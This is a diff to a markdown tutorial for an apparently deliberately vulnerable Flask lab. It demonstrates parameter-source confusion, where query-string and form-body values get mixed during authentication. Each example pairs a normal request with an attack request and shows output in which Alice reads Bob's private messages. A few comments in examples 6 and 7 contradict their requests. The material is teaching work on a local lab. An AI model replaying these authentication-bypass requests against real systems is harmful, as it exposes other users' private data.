@@ -49,7 +49,7 @@ def example0():
     return messages
 ```
 
-<details>
+<details open>
   <summary><b>See HTTP Request</b></summary>
 
 ```http
@@ -102,7 +102,7 @@ user=alice
 ###
 
 # Attack
-GET http://localhost:8000/vuln/confusion/parameter-source/example1?user=alice&password=123456 HTTP/1.1
+GET http://localhost:8000/vuln/confusion/parameter-source/example1?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
 
 user=bob
@@ -143,7 +143,7 @@ def example2():
     return messages
 ```
 
-<details>
+<details open>
   <summary><b>See HTTP Request</b></summary>
 
 ```http
@@ -165,7 +165,7 @@ user=alice
 ###
 
 # Attack
-GET http://localhost:8000/vuln/confusion/parameter-source/example2?user=alice&password=123456 HTTP/1.1
+GET http://localhost:8000/vuln/confusion/parameter-source/example2?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
 
 user=bob
@@ -235,7 +235,7 @@ user=alice
 ###
 
 # Attack
-GET http://localhost:8000/vuln/confusion/parameter-source/example3?user=alice&password=123456 HTTP/1.1
+GET http://localhost:8000/vuln/confusion/parameter-source/example3?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
 
 user=bob
@@ -293,15 +293,47 @@ def example4():
     return messages
 ```
 
-Request:
+<details>
+  <summary><b>See HTTP Request</b></summary>
 
 ```http
-GET /vuln/confusion/parameter-source/example4?user=alice&password=123456 HTTP/1.1
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example4?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 8
+
+user=alice
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example4?user=alice&password=123456
+Content-Type: application/x-www-form-urlencoded
 
 user=bob
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
 ```
+</details>
 
 ### Example 5: Mixed-Source Authentication
 
@@ -328,15 +360,47 @@ def example5():
     return messages
 ```
 
-Request:
+<details>
+  <summary><b>See HTTP Request</b></summary>
 
 ```http
-GET /vuln/confusion/parameter-source/example5?user=bob&password=123456 HTTP/1.1
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example5?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 10
 
 user=alice
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example5?user=bob&password=123456
+Content-Type: application/x-www-form-urlencoded
+
+user=alice
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
 ```
+</details>
 
 ![alt text](images/image-5.png)
 
@@ -345,22 +409,7 @@ user=alice
 ### Example 6: Form Authentication Bypass
 
 The endpoint uses form data for authentication, but request.values.get() allows query
-parameters to override form values, creating a vulnerability. Although designed for POST
-requests, the endpoint accepts both GET and POST methods, enabling the attack.
-
-Note that although the regular usage would rely on POST request (or PUT, PATCH, etc.),
-and wouldn't work with GET (because flask's request.values ignores form data in GET
-requests), meaning normally web app would be sending:
-
-```http
-POST /vuln/confusion/parameter-source/example6? HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 26
-
-user=alice&password=123456
-```
-
-However, the attacker can send both GET and POST requests (if the endpoint is configured to accept both methods).
+parameters to override form values, creating a vulnerability.
 
 ```python
 def authenticate_user_example6():
@@ -383,15 +432,55 @@ def example6():
     return messages
 ```
 
-Request:
+<details open>
+  <summary><b>See HTTP Request</b></summary>
 
 ```http
-POST /vuln/confusion/parameter-source/example6?user=bob HTTP/1.1
+# Regular requests would pass credentials solely via POST body:
+POST http://localhost:8000/vuln/confusion/parameter-source/example6
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 26
 
 user=alice&password=123456
+
+# And as usual, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+
+###
+
+# Attacker can get Alice's messages by adding user=alice to the query string:
+POST http://localhost:8000/vuln/confusion/parameter-source/example6?user=bob
+Content-Type: application/x-www-form-urlencoded
+
+user=alice&password=123456
+###
+
+# Notably, attack works even with the GET request, assuming it's enabled:
+GET http://localhost:8000/vuln/confusion/parameter-source/example6?user=bob
+Content-Type: application/x-www-form-urlencoded
+
+user=alice&password=123456
+
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
 ```
+</details>
 
 ![alt text](images/image-4.png)
 
@@ -421,15 +510,36 @@ def example7():
     return messages
 ```
 
-Request:
+
+<details>
+  <summary><b>See HTTP Request</b></summary>
 
 ```http
-POST /vuln/confusion/parameter-source/example7?user=alice HTTP/1.1
+# Regular requests would pass credentials solely via POST body:
+POST http://localhost:8000/vuln/confusion/parameter-source/example7
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 24
+
+user=alice&password=123456
+
+# And as usual, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+
+###
+
+# Attacker can get Alice's messages by adding user=alice to the query string:
+POST http://localhost:8000/vuln/confusion/parameter-source/example7?user=alice
+Content-Type: application/x-www-form-urlencoded
 
 user=bob&password=123456
 ```
+</details>
 
 ![alt text](images/image-6.png)
 
@@ -461,15 +571,45 @@ def example8():
     return messages
 ```
 
-Request:
+<details>
+  <summary><b>See HTTP Request</b></summary>
+
 
 ```http
-GET /vuln/confusion/parameter-source/example8?user=alice&password=123456 HTTP/1.1
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example8?user=alice&password=123456
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example8?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 8
 
 user=bob
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
 ```
+</details>
 
 ## Middleware-based Authentication
 
@@ -503,10 +643,41 @@ def register_middleware(app):
     return verify_user
 ```
 
+<details>
+  <summary><b>See HTTP Request</b></summary>
+
 ```http
-GET /vuln/confusion/parameter-source/example9?user=alice&password=123456 HTTP/1.1
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example9?user=alice&password=123456
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example9?user=alice&password=123456
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 8
 
 user=bob
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
 ```
+</details>
